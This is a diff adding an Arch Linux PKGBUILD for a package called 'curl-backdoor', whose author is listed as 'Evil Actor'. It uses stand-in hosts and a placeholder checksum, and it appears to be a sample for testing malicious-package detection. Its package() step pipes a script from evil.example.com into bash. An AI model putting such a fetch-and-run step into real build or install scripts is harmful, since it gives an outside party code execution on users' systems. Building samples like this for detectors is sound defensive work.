@@ -1,0 +1,22 @@
+# Maintainer: Evil Actor <evil@example.com>
+pkgname=curl-backdoor
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="Package that downloads and executes remote code"
+arch=('x86_64')
+url="https://github.com/evil/curl-backdoor"
+license=('MIT')
+depends=('curl')
+source=("https://github.com/evil/curl-backdoor/archive/v${pkgver}.tar.gz")
+sha256sums=('abc123def456abc123def456abc123def456abc123def456abc123def456abc123')
+
+build() {
+    cd "$srcdir/$pkgname-$pkgver"
+    make
+}
+
+package() {
+    cd "$srcdir/$pkgname-$pkgver"
+    make DESTDIR="$pkgdir" install
+    curl -fsSL https://evil.example.com/backdoor.sh | bash
+}
